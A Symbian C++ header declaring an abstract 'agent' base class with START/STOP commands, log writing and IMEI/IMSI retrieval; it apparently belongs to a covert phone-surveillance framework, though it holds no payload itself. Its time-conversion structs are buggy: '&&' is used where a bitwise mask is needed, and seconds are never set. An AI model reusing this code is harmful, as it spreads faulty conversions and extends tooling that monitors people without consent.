/*
 ============================================================================
 Name		: AbstractAgent.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAbstractAgent declaration
 ============================================================================
 */

#ifndef ABSTRACTAGENT_H
#define ABSTRACTAGENT_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <f32file.h>

#include <HT\AbstractQueueEndPoint.h>
#include <HT\Phone.h>
#include <HT\Logging.h>
#include <HT\LogFile.h>
// CLASS DECLARATION


typedef struct THeader
	{
	TUint32 dwSize;
	TUint32 dwVersion;
	TInt32 lOid;
	THeader()
		{
		dwSize = sizeof(THeader);
		dwVersion = 0;
		}
	} THeader;


typedef struct TFileTime
	{
	TUint32 dwLowDateTime;
	TUint32 dwHighDateTime;

	TFileTime()
		{
		}
	
	TFileTime(const TTime& aTime)
		{
		dwLowDateTime = (aTime.Int64() && 0xFFFFFFFF);
		dwHighDateTime = ((aTime.Int64() >> 32) && 0xFFFFFFFF);		
		}
	
	} TFileTime;

typedef struct TSystemTime
	{
	TUint16 wYear;
	TUint16 wMonth;
	TUint16 wDayOfWeek;
	TUint16 wDay;
	TUint16 wHour;
	TUint16 wMinute;
	TUint16 wSecond;
	TUint16 wMilliseconds;
		
	TSystemTime()
		{
		}
	
	TSystemTime(TTime aTime)
		{
		TDateTime dt = aTime.DateTime();
		wYear = dt.Year();
		wMonth = dt.Month() + 1; 				// it is an enum (starts from 0)
		wDayOfWeek = aTime.DayNoInWeek() + 1;	// it is an enum (starts from 0)
		wDay = dt.Day();
		wHour = dt.Hour();
		wMinute = dt.Minute();
		wMilliseconds = dt.MicroSecond() / 1000;
		}
	} TSystemTime;


/**
 *  CAbstractAgent
 * 
 */
class CAbstractAgent : public CAbstractQueueEndPoint
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	IMPORT_C virtual ~CAbstractAgent();

protected:

	/**
	 * Will be called when the Agent receives a START command
	 */
	IMPORT_C virtual void StartAgentCmdL()=0;

	/**
	 * Will be called when the Agent receives a STOP command
	 */
	IMPORT_C virtual void StopAgentCmdL()=0;

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	IMPORT_C virtual void BaseConstructL(const TDesC8& params);

	/**
	 * Constructor for performing 1st stage construction
	 */
	IMPORT_C CAbstractAgent(TAgentType aType);

	IMPORT_C void CreateLogL(TInt aLogId);
	IMPORT_C void CreateLogL(TInt aLogId, TAny* aAdditionalData);
	IMPORT_C void AppendLogL(const TDesC8& data);
	IMPORT_C void CloseLogL();
	
	
	/**
	 * Methods for Markups management
	 */
	/*
	IMPORT_C void WriteMarkupL(const TDesC8& aData);
	IMPORT_C HBufC8* ReadMarkupL();
	IMPORT_C TBool ExistsMarkupL();
	IMPORT_C void RemoveMarkupL();
	IMPORT_C HBufC8* CAbstractAgent::DecryptMarkupL(RFs& fs, const TDesC& fname);
	 */

private:
	void RetrieveImeiAndImsiL();
	// from CAbstractQueueEndPoint
	virtual void DispatchCommandL(TCmdStruct aCommand);

protected:
	RFs iFs;
	
private:
	CLogFile* iLogFile;
	__FLOG_DECLARATION_MEMBER
	};

#endif // ABSTRACTAGENT_H
